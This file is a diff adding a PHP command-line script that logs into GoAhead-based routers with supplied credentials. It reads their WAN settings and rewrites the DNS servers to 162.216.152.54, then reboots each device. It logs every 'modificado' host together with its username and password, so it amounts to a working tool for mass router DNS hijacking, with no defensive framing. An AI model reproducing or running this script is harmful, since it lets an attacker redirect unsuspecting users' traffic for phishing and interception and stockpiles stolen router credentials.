@@ -1,0 +1,106 @@
+#!/usr/bin/php -H
+<?php
+
+error_reporting(NULL);
+ini_set("display_errors", 0);
+
+$HOSTNAME = $argv[1];
+$USERNAME = $argv[2];
+$PASSWORD = $argv[3];
+$AUTH = $USERNAME . ":" . $PASSWORD;
+
+$URL = "http://" . $HOSTNAME . "/tcpipwan.asp";
+
+$chopts = array(
+        CURLOPT_URL=>$URL,
+        CURLOPT_PORT=>80,
+        CURLOPT_TIMEOUT=>5,
+        CURLOPT_RETURNTRANSFER=>true,
+        CURLOPT_USERPWD=>$AUTH);
+
+$ch = curl_init();
+curl_setopt_array($ch, $chopts);
+$html = curl_exec($ch);
+
+$dom = new DOMDocument;
+@$dom->loadHTML($html);
+$xpath = new DOMXPath($dom);
+$data = array();
+
+
+$selects = $xpath->query('//select');
+foreach($selects as $select) {
+	if($name = $select->getAttribute('name')) {
+		$sOption = $select->getElementsByTagName('option');
+		for($i = 0; $i < $sOption->length; $i++ ) {
+			if($sOption->item($i)->hasAttribute('selected') && $sOption->item($i)->getAttribute('selected') === "selected") {
+				$option = $sOption->item($i)->getAttribute('value');
+				$data[$name] = $option;
+			}
+		}
+    }
+}
+
+$inputs = $xpath->query('//input');
+foreach($inputs as $input) {
+	if($name = $input->getAttribute('name')) {
+		if($name != "dnsMode" && $name != "dns1" && $name != "dns2" && $name != "dns3" && $name != "pppConnect" && $name != "reset" &&
+		   $name != "pppDisconnect" && $name != "pppIdleTime" && $name != "pptpConnect" && $name != "pptpDisconnect" && $name != "pptpSecurity" &&
+		   $name != "pptpCompress" && $name != "l2tpConnect" && $name != "l2tpDisconnect")
+			$data[$name] = $input->getAttribute('value');
+	}
+}
+
+if(isset($data['dhcpMtuSize'])) $data['dhcpMtuSize'] = '1492';
+
+$POSTVARS = @http_build_query($data) . "&dnsMode=dnsManual&dns1=162.216.152.54&dns2=8.8.8.8&dns3=8.8.4.4";
+echo $POSTVARS . "\n";
+
+
+$URL2 = "http://" . $HOSTNAME . "/goform/formWanTcpipSetup";
+$chopts2 = array(
+	CURLOPT_POST=>1,
+	CURLOPT_POSTFIELDS=>$POSTVARS,
+	CURLOPT_URL=>$URL2,
+	CURLOPT_PORT=>80,
+	CURLOPT_TIMEOUT=>5,
+	CURLOPT_RETURNTRANSFER=>false,
+	CURLOPT_FOLLOWLOCATION=>false,
+	//CURLOPT_NOBODY=>true,
+	CURLOPT_USERPWD=>$AUTH);
+
+$ch2 = @curl_init();
+curl_setopt_array($ch2, $chopts2);
+$html2 = @curl_exec($ch2);
+
+
+$URL3 = "http://" . $HOSTNAME . "/goform/formRebootCheck";
+$chopts3 = array(
+	CURLOPT_POST=>1,
+	CURLOPT_POSTFIELDS=>"submit-url=%2Ftcpipwan.asp",
+	CURLOPT_URL=>$URL3,
+	CURLOPT_PORT=>80,
+	CURLOPT_TIMEOUT=>5,
+	CURLOPT_RETURNTRANSFER=>false,
+	CURLOPT_FOLLOWLOCATION=>false,
+	CURLOPT_NOBODY=>true,
+	CURLOPT_USERPWD=>$AUTH);
+
+$ch3 = @curl_init();
+curl_setopt_array($ch3, $chopts3);
+$html3 = @curl_exec($ch3);
+
+
+@curl_close($ch);
+@curl_close($ch2);
+@curl_close($ch3);
+
+echo "[+] modificado -> http://$HOSTNAME ($AUTH) [GoAheads]\n";
+
+$logFile = "logs/modificados.log";
+$logText = "http://$HOSTNAME ($AUTH) [GoAheads]\n";
+$logHandler = fopen($logFile, 'a') or die("[!] can't open log file: $logFile");
+@fwrite($logHandler, $logText);
+@fclose($logHandler);
+
+?>
